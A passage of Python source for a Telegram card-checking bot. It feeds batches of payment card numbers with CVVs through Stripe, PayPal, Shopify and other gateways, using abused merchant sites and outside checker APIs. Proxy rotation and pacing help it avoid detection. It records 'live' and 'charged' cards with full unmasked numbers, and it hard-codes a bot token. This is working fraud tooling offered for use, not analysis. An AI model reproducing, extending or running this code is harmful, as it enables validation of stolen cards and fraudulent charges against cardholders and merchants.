                        elif "3d" in msg.lower() or "secure" in msg.lower() or "authentication" in msg.lower():
                            return {
                                "status": "success",
                                "result": "3D_REQUIRED",
                                "message": f"3D Secure Required: {msg}",
                                "status_display": "🔐 3D REQUIRED",
                                "status_category": "approved"
                            }
                        else:
                            return {
                                "status": "declined",
                                "result": "DECLINED",
                                "message": full_msg,
                                "status_display": "❌ DECLINED",
                                "status_category": "declined"
                            }
                    except:
                        return {
                            "status": "declined",
                            "result": "DECLINED",
                            "message": f"HTTP {confirm_res.status_code}",
                            "status_display": "❌ DECLINED",
                            "status_category": "declined"
                        }
            except Exception as e:
                return {
                    "status": "error",
                    "result": "STRIPE_ERROR",
                    "message": f"Stripe confirmation failed: {str(e)[:100]}",
                    "status_display": "⚠️ STRIPE ERROR",
                    "status_category": "error"
                }
        
        # Run the synchronous function in thread pool
        return await run_sync_in_thread(_sync_check)
                
    except Exception as e:
        return {
            "status": "error",
            "result": "ERROR",
            "message": str(e)[:100],
            "status_display": "⚠️ ERROR",
            "status_category": "error"
        }

def format_stripe_auth_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
    """Format Stripe Auth response for display"""
    bin_info_text, bank, country, currency_code, country_code = bin_info
    
    status_display = result.get("status_display", "⚠️ UNKNOWN")
    status_category = result.get("status_category", "unknown")
    response_msg = result.get("message", "Unknown")
    
    ui = (
        f"┏━━━━━━━⍟\n"
        f"┃ {status_display}\n"
        f"┗━━━━━━━━━━━⊛\n\n"
        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card}</code>\n"
        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ Stripe Auth\n"
        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {response_msg}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country}\n"
        f"━━━━━━━━━━━━━━━━━━━"
    )
    return ui, status_category

async def stripe_auth_mass_check_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list):
    """Mass check logic for Stripe Auth gateway - FIXED for multi-user"""
    u_id = update.effective_user.id
    message = update.effective_message
    

    
    # REMOVED global semaphore acquisition
    # if not await user_semaphore.acquire():
    #     await message.reply_text("⚠️ Bot is busy with many users. Please try again in a moment.")
    #     return
    
    try:
        stripe_auth_active_tasks[u_id] = True
        
        approved, declined, errors = 0, 0, 0
        total = len(cards)
        start_time_session = time.time()
        results_sent = 0
        
        tier = "free"  # Default
        if u_id == OWNER_ID:
            tier = "admin"
            
        if u_id not in user_speed_controllers:
            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[u_id]
        
        await message.reply_text(
            f"🔄 <b>Stripe Auth Batch Started</b>\n\n"
            f"📝 Cards: {total}\n"
            f"📍 Using Stripe Auth Gateway (alevelbiology.co.uk)\n"
            f"⚡ Speed: {TIER_SPEEDS.get(tier, 900)} cards/hour ({TIER_CONCURRENCY.get(tier, 1)} parallel)\n"
            f"📊 Only approved cards will be shown\n"
            f"👥 Other users can still use the bot",
            parse_mode=ParseMode.HTML,
            reply_markup=stop_markup(u_id)
        )
        
        semaphore = asyncio.Semaphore(TIER_CONCURRENCY.get(tier, 1))
        
        async def check_with_control(card):
            async with semaphore:
                await speed_controller.wait_if_needed()
                
                start = time.time()
                proxy_str = get_proxy_for_user(u_id) if user_manager.can_use_proxy(u_id) else None
                result = await check_card_stripe_auth(card, proxy_str)
                elapsed = time.time() - start
                speed_controller.record_response(elapsed)
                
                return result, card, elapsed
        
        chunk_size = min(10, TIER_CONCURRENCY.get(tier, 1))
        for i in range(0, len(cards), chunk_size):
            if u_id not in stripe_auth_active_tasks:
                try:
                    await message.reply_text("🛑 <b>Session stopped</b>", parse_mode=ParseMode.HTML)
                except:
                    pass
                break
            
            chunk = cards[i:i+chunk_size]
            tasks = [check_with_control(card) for card in chunk]
            
            try:
                chunk_results = await asyncio.wait_for(
                    asyncio.gather(*tasks, return_exceptions=True),
                    timeout=180
                )
            except asyncio.TimeoutError:
                await message.reply_text("⚠️ Chunk processing timeout, continuing...")
                continue
            
            for idx, item in enumerate(chunk_results, i+1):
                if u_id not in stripe_auth_active_tasks:
                    break
                
                if isinstance(item, Exception):
                    errors += 1
                    continue
                
                result, card, elapsed = item
                    
                try:
                    bin_info = await get_bin_info(card)
                    ui, status_category = format_stripe_auth_response(result, card, bin_info)
                except Exception as e:
                    errors += 1
                    continue
                
                if status_category in ["approved"]:
                    try:
                        await save_hit_to_file(
                            card=card,
                            gateway="Stripe Auth",
                            response=result.get("message", "Approved"),
                            price="$0.00",
                            bin_info=bin_info,
                            user_id=u_id,
                            user_tier=tier
                        )
                    except Exception as e:
                        pass
                
                if status_category == "approved":
                    approved += 1
                    try:
                        stats = speed_controller.get_stats()
                        progress = int((idx/total)*10)
                        bar = "▓" * progress + "░" * (10 - progress)
                        
                        
                        await asyncio.wait_for(
                            message.reply_text(ui, parse_mode=ParseMode.HTML),
                            timeout=10
                        )
                        results_sent += 1
                    except Exception as e:
                        pass
                        
                elif status_category == "declined":
                    declined += 1
                else:
                    errors += 1
                
                await asyncio.sleep(0.001)
        
        if u_id in stripe_auth_active_tasks:
            total_time = time.time() - start_time_session
            stats = speed_controller.get_stats()
            summary = (
                f"🏁 <b>Stripe Auth Session Finished</b>\n\n"
                f"✅ Approved: {approved}\n"
                f"❌ Declined: {declined}\n"
                f"⚠️ Errors: {errors}\n"
                f"📝 Total: {total}\n"
                f"⚡ Speed: {stats['current_cph']:.0f}/{stats['target_cph']} cph\n"
                f"⏱️ Time: {int(total_time//60)}m {int(total_time%60)}s"
            )
            try:
                await message.reply_text(summary, parse_mode=ParseMode.HTML)
            except Exception as e:
                pass
            
    except Exception as e:
        try:
            await message.reply_text(f"❌ Error in session: {str(e)[:100]}")
        except:
            pass
    finally:
        stripe_auth_active_tasks.pop(u_id, None)
        # REMOVED global semaphore release
        # user_semaphore.release()

async def stripe_auth_single_check_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, card: str):
    """Single check logic for Stripe Auth gateway"""
    u_id = update.effective_user.id
    message = update.effective_message
    

    
    try:
        allowed, error_msg = await check_user_access(update, context, "stripe_auth")
        if not allowed:
            await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
            return
        
        tier = user_manager.get_tier(u_id)
        if u_id not in user_speed_controllers:
            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[u_id]
        
        status_msg = await message.reply_text("🔄 Checking card with Stripe Auth...")
        
        await speed_controller.wait_if_needed()
        start = time.time()
        
        proxy_str = get_proxy_for_user(u_id) if user_manager.can_use_proxy(u_id) else None
        result = await check_card_stripe_auth(card, proxy_str)
        
        elapsed = time.time() - start
        speed_controller.record_response(elapsed)
        
        bin_info = await get_bin_info(card)
        ui, status_category = format_stripe_auth_response(result, card, bin_info)
        
        if status_category == "approved":
            user_data = user_manager.get_user(u_id)
            await send_hit_notification(
                context=context,
                gateway="Stripe Auth",
                card=card,
                response=result.get("message", "Approved"),
                price="$0.00",
                user=user_data,
                bin_info=bin_info,
                status_category=status_category
            )
            
            await save_hit_to_file(
                card=card,
                gateway="Stripe Auth",
                response=result.get("message", "Approved"),
                price="$0.00",
                bin_info=bin_info,
                user_id=u_id,
                user_tier=tier
            )
            
            user_manager.increment_checks(u_id)
        
        ui += f"\n[⌬] 𝐒𝐩𝐞𝐞𝐝 ↣ {elapsed:.2f}s"
        
        await status_msg.edit_text(ui, parse_mode=ParseMode.HTML)
        
    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)[:100]}")
        print(f"❌ [Stripe Auth Single] Error: {traceback.format_exc()}")

# --- CONFIG ---
BOT_TOKEN = '8536391158:AAG-luyLoZ98PteTVfGvp3Rden8dhO----4'
OWNER_ID = 6299808404
PAYPAL_API_BASE = "https://web-production-9c43d.up.railway.app"

# Razorpay API Configuration
RAZORPAY_API_BASE = "https://rzpauto-production.up.railway.app/rzp"

NEW_AUTOSOPI_API_BASE = "http://108.165.12.183:8081"
NEW_AUTOSOPI_API_ENDPOINT = f"{NEW_AUTOSOPI_API_BASE}/"
AUTOSOPI_API_KEY = ""  # Not needed for this API, using URL parameters

# Backup APIs (keep as fallbacks)
BACKUP_SHOPIFY_API = "https://web-production-750ad.up.railway.app/shopify"  # 1st Backup (Railway)
BACKUP_SHOPIFY_API_2 = "http://108.165.12.183:8081"  # 2nd Backup (already same as main)

# API endpoints
BACKUP_SHOPIFY_API_2_ENDPOINT = f"{BACKUP_SHOPIFY_API_2}/"

# Data files
USER_DATA_FILE = "users.json"
PROXY_STATS_FILE = "proxy_stats.json"
AUTOSOPI_SITES_FILE = "autosopi_sites.json"
AUTOSOPI_PENDING_SITES_FILE = "autosopi_pending_sites.json"

# Global variables
active_tasks = {}
pending_files = {}
proxy_list = []
# Add these global variables at the top with other global variables
site_success_stats = {}  # site -> {total_checks, declined_count, success_count}
proxy_success_stats = {}  # proxy -> {total_checks, declined_count, success_count}
# Add at the top with other global variables
pending_results = {}  # user_id -> list of results
RESULT_BATCH_SIZE = 5
RESULT_BATCH_INTERVAL = 10  # seconds
current_proxy_index = 0
checked_count = 0
approved_count_global = 0
start_time_bot = time.time()

# Gateway-specific task dictionaries
paypal_active_tasks = {}
shopify_active_tasks = {}
razorpay_active_tasks = {}
stripe_charge_active_tasks = {}
stripe_auth_active_tasks = {}
braintree_active_tasks = {}
autosopi_active_tasks = {}
payflow_active_tasks = {}
b3charged_active_tasks = {}
adyen_direct_active_tasks = {}
# Speed controllers per user
user_speed_controllers = {}
auto_stripe_active_tasks = {}

# Default payment amount
DEFAULT_AMOUNT = "1.00"
DEFAULT_CURRENCY = "USD"

# ============ PAYPAL SPEED OPTIMIZATION ============
PAYPAL_RETRY_COUNT = 1  # REDUCED from 2 to 1 (only 1 retry max)
PAYPAL_RETRY_DELAY = 1  # REDUCED from 3 to 1 second
PAYPAL_TIMEOUT = 90.0   # NEW: Reduced from 45s to 20s
PAYPAL_CONNECT_TIMEOUT = 10.0  # NEW: Connection timeout
PAYPAL_READ_TIMEOUT = 15.0     # NEW: Read timeout

# ============ AUTO STRIPE SITE MANAGEMENT COMMANDS ============

async def set_autosite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set your preferred Auto Stripe site - /setautosite <site>"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    
    if not context.args:
        current = auto_stripe_site_manager.get_site_for_user(user_id)
        await update.message.reply_text(
            f"🌐 <b>Auto Stripe Site Settings</b>\n\n"
            f"Current site: <code>{current}</code>\n\n"
            f"Usage: /setautosite &lt;site&gt;\n"
            f"Example: /setautosite dilaboards.com\n\n"
            f"To reset to rotation: /resetautosite",
            parse_mode=ParseMode.HTML
        )
        return
    
    site = context.args[0].strip().lower()
    # Remove http:// or https:// if present
    site = site.replace('http://', '').replace('https://', '').split('/')[0]
    
    auto_stripe_site_manager.set_user_site(user_id, site)
    
    await update.message.reply_text(
        f"✅ <b>Auto Stripe site set to:</b> <code>{site}</code>\n\n"
        f"Now you can use /chk &lt;card&gt; without specifying site each time.",
        parse_mode=ParseMode.HTML
    )

async def reset_autosite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Reset to use default site rotation"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    auto_stripe_site_manager.reset_user_to_default(user_id)
    
    next_site = auto_stripe_site_manager.get_site_for_user(user_id)
    
    await update.message.reply_text(
        f"🔄 <b>Reset to default site rotation</b>\n\n"
        f"Next site: <code>{next_site}</code>",
        parse_mode=ParseMode.HTML
    )

async def list_autosites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all available default Auto Stripe sites"""
    if not await verify_group_access(update, context):
        return
    
    sites = auto_stripe_site_manager.get_default_sites_list()
    
    msg = "🌐 <b>Available Auto Stripe Sites</b>\n\n"
    for i, site in enumerate(sites, 1):
        msg += f"{i}. <code>{site}</code>\n"
    
    msg += f"\nTotal: {len(sites)} sites\n"
    msg += f"Use /setautosite to set your preferred site."
    
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())

# Admin commands to manage sites
async def add_autosite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add a new default site (admin only)"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /addautosite <site>")
        return
    
    site = context.args[0].strip().lower()
    
    if auto_stripe_site_manager.add_default_site(site):
        await update.message.reply_text(f"✅ Added site: {site}")
    else:
        await update.message.reply_text(f"❌ Site already exists.")

async def remove_autosite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove a default site (admin only)"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /removeautosite <site>")
        return
    
    site = context.args[0].strip().lower()
    
    if auto_stripe_site_manager.remove_default_site(site):
        await update.message.reply_text(f"✅ Removed site: {site}")
    else:
        await update.message.reply_text(f"❌ Site not found.")
        
        
class SiteProxyTracker:
    """Track successful proxies and sites that actually work (CARD_DECLINED means working)"""
    
    def __init__(self):
        self.sites = {}  # site -> {checks: 0, declined: 0, last_success: 0}
        self.proxies = {}  # proxy -> {checks: 0, declined: 0, last_success: 0}
        self.site_proxy_map = {}  # site -> list of working proxies
        self.proxy_site_map = {}  # proxy -> list of working sites
        
    def record_result(self, site: str, proxy: str, result: Dict, elapsed: float):
        """
        Record a check result.
        CARD_DECLINED = site and proxy are working (card just declined)
        """
        response_text = result.get("Response", "UNKNOWN")
        status_category = result.get("status_category", "unknown")
        is_working = False
        
        # Check if this response indicates the site/proxy are working
        working_indicators = [
            "CARD_DECLINED",
            "INSUFFICIENT FUNDS",
            "OTP REQUIRED",
            "3D REQUIRED",
            "CVV LIVE"
        ]
        
        if any(indicator in response_text.upper() for indicator in working_indicators):
            is_working = True
        
        # Record site stats
        if site not in self.sites:
            self.sites[site] = {
                'checks': 0,
                'declined': 0,
                'approved': 0,
                'charged': 0,
                'errors': 0,
                'last_success': 0,
                'total_time': 0,
                'avg_time': 0
            }
        
        site_stats = self.sites[site]
        site_stats['checks'] += 1
        site_stats['total_time'] += elapsed
        
        if is_working:
            site_stats['last_success'] = time.time()
            if "CARD_DECLINED" in response_text.upper():
                site_stats['declined'] += 1
            elif "INSUFFICIENT" in response_text.upper():
                site_stats['declined'] += 1
            elif "OTP" in response_text.upper() or "3D" in response_text.upper():
                site_stats['approved'] += 1
            elif "CVV LIVE" in response_text.upper():
                site_stats['approved'] += 1
            elif "CHARGED" in response_text.upper():
                site_stats['charged'] += 1
        else:
            site_stats['errors'] += 1
        
        site_stats['avg_time'] = site_stats['total_time'] / site_stats['checks']
        
        # Record proxy stats
        if proxy:
            if proxy not in self.proxies:
                self.proxies[proxy] = {
                    'checks': 0,
                    'declined': 0,
                    'approved': 0,
                    'charged': 0,
                    'errors': 0,
                    'last_success': 0,
                    'total_time': 0,
                    'avg_time': 0,
                    'working_sites': []
                }
            
            proxy_stats = self.proxies[proxy]
            proxy_stats['checks'] += 1
            proxy_stats['total_time'] += elapsed
            
            if is_working:
                proxy_stats['last_success'] = time.time()
                if "CARD_DECLINED" in response_text.upper():
                    proxy_stats['declined'] += 1
                elif "INSUFFICIENT" in response_text.upper():
                    proxy_stats['declined'] += 1
                elif "OTP" in response_text.upper() or "3D" in response_text.upper():
                    proxy_stats['approved'] += 1
                elif "CVV LIVE" in response_text.upper():
                    proxy_stats['approved'] += 1
                elif "CHARGED" in response_text.upper():
                    proxy_stats['charged'] += 1
                
                # Track which sites this proxy works with
                if site not in proxy_stats['working_sites']:
                    proxy_stats['working_sites'].append(site)
            else:
                proxy_stats['errors'] += 1
            
            proxy_stats['avg_time'] = proxy_stats['total_time'] / proxy_stats['checks']
            
            # Update site-proxy mapping
            if site not in self.site_proxy_map:
                self.site_proxy_map[site] = []
            if proxy not in self.site_proxy_map[site] and is_working:
                self.site_proxy_map[site].append(proxy)
            
            if proxy not in self.proxy_site_map:
                self.proxy_site_map[proxy] = []
            if site not in self.proxy_site_map[proxy] and is_working:
                self.proxy_site_map[proxy].append(site)
        
        # Auto-save every 50 checks
        if (site_stats['checks'] + sum(p['checks'] for p in self.proxies.values())) % 50 == 0:
            self.save_stats()
    
    def get_best_sites(self, limit: int = 10, min_checks: int = 5) -> list:
        """Get sites with highest success rate (working responses)"""
        valid_sites = []
        for site, stats in self.sites.items():
            if stats['checks'] >= min_checks:
                working_count = stats['declined'] + stats['approved'] + stats['charged']
                success_rate = (working_count / stats['checks']) * 100
                valid_sites.append((site, success_rate, stats['avg_time'], working_count, stats['checks']))
        
        # Sort by success rate (highest first), then by speed
        valid_sites.sort(key=lambda x: (-x[1], x[2]))
        return valid_sites[:limit]
    
    def get_best_proxies(self, limit: int = 10, min_checks: int = 5) -> list:
        """Get proxies with highest success rate (working responses)"""
        valid_proxies = []
        for proxy, stats in self.proxies.items():
            if stats['checks'] >= min_checks:
                working_count = stats['declined'] + stats['approved'] + stats['charged']
                success_rate = (working_count / stats['checks']) * 100
                valid_proxies.append((proxy, success_rate, stats['avg_time'], working_count, stats['checks']))
        
        # Sort by success rate (highest first), then by speed
        valid_proxies.sort(key=lambda x: (-x[1], x[2]))
        return valid_proxies[:limit]
    
    def get_site_score(self, site: str) -> float:
        """Get a score for a site based on performance"""
        if site not in self.sites:
            return 0
        stats = self.sites[site]
        if stats['checks'] < 3:
            return 0
        working_count = stats['declined'] + stats['approved'] + stats['charged']
        success_rate = working_count / stats['checks']
        speed_factor = 1 / (stats['avg_time'] / 10) if stats['avg_time'] > 0 else 1
        return success_rate * speed_factor * 100
    
    def get_proxy_score(self, proxy: str) -> float:
        """Get a score for a proxy based on performance"""
        if proxy not in self.proxies:
            return 0
        stats = self.proxies[proxy]
        if stats['checks'] < 3:
            return 0
        working_count = stats['declined'] + stats['approved'] + stats['charged']
        success_rate = working_count / stats['checks']
        speed_factor = 1 / (stats['avg_time'] / 10) if stats['avg_time'] > 0 else 1
        return success_rate * speed_factor * 100
    
    def get_next_site_weighted(self) -> str:
        """Get next site with weighted selection based on performance"""
        if not self.sites:
            return None
        
        # Calculate weights based on site scores
        sites_with_scores = []
        total_score = 0
        
        for site in autosopi_site_manager.sites:
            score = self.get_site_score(site)
            # Minimum score to be considered (avoid untested sites)
            if score > 0:
                sites_with_scores.append((site, score))
                total_score += score
            else:
                # Untested sites get a base weight
                sites_with_scores.append((site, 10))
                total_score += 10
        
        if not sites_with_scores:
            return autosopi_site_manager.get_next_site()
        
        # Weighted random selection
        r = random.uniform(0, total_score)
        cumulative = 0
        for site, score in sites_with_scores:
            cumulative += score
            if r <= cumulative:
                return site
        
        return sites_with_scores[0][0]
    
    def get_next_proxy_weighted(self, user_id: int) -> Optional[str]:
        """Get next proxy with weighted selection based on performance"""
        if user_id not in proxy_manager.user_proxies or not proxy_manager.user_proxies[user_id]:
            return None
        
        proxies = proxy_manager.user_proxies[user_id]
        
        # Calculate weights based on proxy scores
        proxies_with_scores = []
        total_score = 0
        
        for proxy in proxies:
            score = self.get_proxy_score(proxy)
            if score > 0:
                proxies_with_scores.append((proxy, score))
                total_score += score
            else:
                # Untested proxies get a base weight
                proxies_with_scores.append((proxy, 10))
                total_score += 10
        
        if not proxies_with_scores:
            return proxies[0] if proxies else None
        
        # Weighted random selection
        r = random.uniform(0, total_score)
        cumulative = 0
        for proxy, score in proxies_with_scores:
            cumulative += score
            if r <= cumulative:
                return proxy
        
        return proxies_with_scores[0][0]
    
    def get_stats(self) -> str:
        """Get formatted statistics"""
        best_sites = self.get_best_sites(5)
        best_proxies = self.get_best_proxies(5)
        
        result = "📊 <b>Site & Proxy Performance</b>\n\n"
        
        result += "🏆 <b>Best Sites:</b>\n"
        for site, rate, avg_time, working, checks in best_sites:
            result += f"  • <code>{site}</code>\n"
            result += f"    ✅ Success: {rate:.1f}% ({working}/{checks}) | ⏱️ {avg_time:.1f}s\n"
        
        result += "\n🔌 <b>Best Proxies:</b>\n"
        for proxy, rate, avg_time, working, checks in best_proxies:
            result += f"  • {mask_proxy(proxy)}\n"
            result += f"    ✅ Success: {rate:.1f}% ({working}/{checks}) | ⏱️ {avg_time:.1f}s\n"
        
        return result
    
    def save_stats(self):
        """Save stats to file"""
        try:
            data = {
                'sites': self.sites,
                'proxies': self.proxies,
                'site_proxy_map': self.site_proxy_map,
                'proxy_site_map': self.proxy_site_map,
                'timestamp': time.time()
            }
            with open('site_proxy_stats.json', 'w') as f:
                json.dump(data, f, indent=2)
            print(f"💾 Saved site/proxy stats")
        except Exception as e:
            print(f"⚠️ Error saving stats: {e}")
    
    def load_stats(self):
        """Load stats from file"""
        if Path('site_proxy_stats.json').exists():
            try:
                with open('site_proxy_stats.json', 'r') as f:
                    data = json.load(f)
                    self.sites = data.get('sites', {})
                    self.proxies = data.get('proxies', {})
                    self.site_proxy_map = data.get('site_proxy_map', {})
                    self.proxy_site_map = data.get('proxy_site_map', {})
                print(f"📊 Loaded stats for {len(self.sites)} sites and {len(self.proxies)} proxies")
            except Exception as e:
                print(f"⚠️ Error loading stats: {e}")

# Create global instance
site_proxy_tracker = SiteProxyTracker()

# ============ NEW STRIPE API CHECK FUNCTION ============

async def check_card_new_stripe(card: str, proxy: str = None) -> Dict:
    """
    Check card using the new Stripe API endpoint.
    For this API: "fraudulent" code = CHARGED/LIVE card
    """
    print(f"\n{'='*80}")
    print(f"💳 [NEW STRIPE API] Checking card: {card[:20]}...")
    if proxy:
        print(f"🔌 Using proxy: {mask_proxy(proxy)}")
    print(f"{'='*80}")
    
    default_result = {
        "status": "error",
        "result": "UNKNOWN_ERROR",
        "message": "Unknown error occurred",
        "status_display": "⚠️ ERROR",
        "status_category": "error",
        "elapsed": 0,
        "proxy_used": proxy,
        "retryable": False,
        "price": "$0.50"
    }
    
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {
                "status": "error",
                "result": "INVALID_FORMAT",
                "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
                "status_display": "⚠️ INVALID FORMAT",
                "status_category": "error"
            }
        
        card_num, card_mm, card_yy, card_cvv = parts
        
        if len(card_yy) == 4:
            card_yy = card_yy[2:]
        
        formatted_card = f"{card_num}|{card_mm}|{card_yy}|{card_cvv}"
        api_url = f"https://stripe-production-45f5.up.railway.app/stripe/key=public/cc={formatted_card}"
        
        print(f"📤 Request URL: {api_url}")
        
        start_time = time.time()
        
        headers = {
            'User-Agent': generate_user_agent(),
            'Accept': 'application/json',
        }
        
        async with httpx.AsyncClient(timeout=60.0, verify=False, follow_redirects=True) as client:
            response = await client.get(api_url, headers=headers)
        
        elapsed = time.time() - start_time
        print(f"📥 Response time: {elapsed:.2f}s")
        print(f"📊 Status code: {response.status_code}")
        
        if response.status_code == 200:
            try:
                data = response.json()
                print(f"✅ Response: {json.dumps(data, indent=2)}")
                
                api_status = data.get('status', 'error')
                api_amount = data.get('amount', '$0.50')
                api_card = data.get('card', card[:6] + '******' + card[-4:])
                api_message = data.get('message', '')
                api_code = data.get('code', '')
                
                # ============ FIXED: Check for FRAUDULENT code FIRST ============
                # For this API: "fraudulent" = CHARGED/LIVE card
                if api_code == 'fraudulent':
                    status_display = "🔥 CHARGED 🔥"
                    status_category = "charged"
                    response_msg = "CHARGED "
                    print(f"🎯 CHARGED DETECTED! Code: {api_code}")
                    
                # ============ Check for 3DS_REQUIRED ============
                elif api_code == "3DS_REQUIRED":
                    status_display = "🔐 3D REQUIRED"
                    status_category = "approved"
                    response_msg = "3D REQUIRED"
                    
                # ============ Check for DECLINED with live indicators ============
                elif api_status == 'declined':
                    # Check for other live indicators
                    if 'insufficient' in api_message.lower():
                        status_display = "💰 INSUFFICIENT FUNDS"
                        status_category = "approved"
                        response_msg = "INSUFFICIENT FUNDS - Card has balance issue"
                    elif 'cvv' in api_message.lower() or 'security' in api_message.lower():
                        status_display = "✅ CVV LIVE"
                        status_category = "approved"
                        response_msg = "CVV LIVE - Card is valid"
                    else:
                        status_display = "❌ DECLINED"
                        status_category = "declined"
                        response_msg = api_message or "DECLINED"
                        
                else:
                    status_display = "⚠️ ERROR"
                    status_category = "error"
                    response_msg = api_message or api_status
                
                result = {
                    "status": "success" if status_category in ["charged", "approved", "declined"] else "error",
                    "result": api_status,
                    "message": response_msg,
                    "status_display": status_display,
                    "status_category": status_category,
                    "elapsed": elapsed,
                    "price": api_amount,
                    "card_display": card,
                    "proxy_used": proxy,
                    "gateway": "New Stripe API",
                    "api_used": "stripe_prod",
                    "raw_status": api_status,
                    "raw_code": api_code
                }
                
                return result
                
            except json.JSONDecodeError as e:
                print(f"⚠️ JSON parse error: {e}")
                default_result["message"] = "Invalid JSON response"
                default_result["elapsed"] = elapsed
                return default_result
        else:
            print(f"⚠️ HTTP error: {response.status_code}")
            default_result["message"] = f"HTTP Error: {response.status_code}"
            default_result["elapsed"] = elapsed
            return default_result
            
    except httpx.TimeoutException:
        print(f"⏰ Timeout error")
        default_result["message"] = "Request timeout - API may be slow"
        return default_result
    except Exception as e:
        print(f"❌ Error: {e}")
        default_result["message"] = str(e)[:100]
        return default_result


def format_new_stripe_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
    """Format new Stripe API response for display - SHOWS FULL CARD"""
    
    # Safety check - if result is None, create default
    if result is None:
        result = {
            "status_display": "⚠️ ERROR",
            "status_category": "error",
            "message": "No response from API",
            "elapsed": 0,
            "proxy_used": "None",
            "price": "$0.50",
            "gateway": "New Stripe API"
        }
    
    bin_info_text, bank, country, currency_code, country_code = bin_info
    
    # Get values with safe defaults
    status_display = result.get("status_display", "⚠️ UNKNOWN")
    status_category = result.get("status_category", "unknown")
    message = result.get("message", "Unknown")
    elapsed = result.get("elapsed", 0)
    proxy_used = result.get("proxy_used", "None")
    price = result.get("price", "$0.50")
    gateway = result.get("gateway", "New Stripe API")
    
    # Show FULL card number (not masked)
    card_display = card
    
    proxy_display = mask_proxy(proxy_used) if proxy_used and proxy_used != "None" else "None"
    
    # Special handling for test card message
    if 'test card' in message.lower() or 'live_mode_test_card' in message.lower():
        status_display = "⚠️ TEST CARD (API Works)"
    
    ui = (
        f"┏━━━━━━━⍟\n"
        f"┃ {status_display}\n"
        f"┗━━━━━━━━━━━⊛\n\n"
        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card_display}</code>\n"
        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ {gateway}\n"
        f"[⌬] 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ {price}\n"
        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {message}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
    )
    
    return ui, status_category

async def new_stripe_mass_check_from_file(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, progress_msg=None):
    """Mass check logic for New Stripe API - Batch mode (3 cards at a time with random delays)"""
    u_id = update.effective_user.id
    message = update.effective_message
    total = len(cards)
    
    print(f"\n{'='*80}")
    print(f"🚀 [NEW STRIPE FILE MASS CHECK - BATCH MODE] Starting batch for user {u_id}")
    print(f"📊 Total cards from file: {total}")
    print(f"📦 Batch size: 3 cards at a time")
    print(f"⏱️ Random delays: 1-2 seconds")
    print(f"{'='*80}")
    
    try:
        stripe_charge_active_tasks[u_id] = True
        
        # Initialize stats dictionary
        stats = {
            "charged": 0,
            "approved": 0,
            "declined": 0,
            "errors": 0,
            "total": total,
            "processed": 0
        }
        
        start_time = time.time()
        
        tier = user_manager.get_tier(u_id)
        if u_id not in user_speed_controllers:
            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[u_id]
        
        # Batch size: 3 cards at a time
        BATCH_SIZE = 3
        # Random delay between cards: 1-2 seconds
        MIN_DELAY = 1.0
        MAX_DELAY = 2.0
        
        if progress_msg is None:
            progress_msg = await message.reply_text(
                f"📁 <b>Processing File - New Stripe API</b>\n\n"
                f"📝 Cards: {total}\n"
                f"💰 Amount: $0.50 per card\n"
                f"📦 Batch: {BATCH_SIZE} cards at a time\n"
                f"⏱️ Random delay: {MIN_DELAY}-{MAX_DELAY}s\n"
                f"🔄 Starting...",
                parse_mode=ParseMode.HTML,
                reply_markup=create_progress_buttons(0, total, 0, 0, "", "Starting...")
            )
        
        results_lock = asyncio.Lock()
        hits_sent = 0
        processed = 0
        
        # Process cards in batches of 3
        for batch_start in range(0, total, BATCH_SIZE):
            if u_id not in stripe_charge_active_tasks:
                break
            
            # Get current batch
            batch_end = min(batch_start + BATCH_SIZE, total)
            batch_cards = cards[batch_start:batch_end]
            batch_number = (batch_start // BATCH_SIZE) + 1
            total_batches = (total + BATCH_SIZE - 1) // BATCH_SIZE
            
            print(f"\n📦 Processing Batch {batch_number}/{total_batches} ({len(batch_cards)} cards)")
            
            # Update progress for batch start
            await update_progress_buttons(
                context, message.chat_id, progress_msg.message_id,
                processed, total,
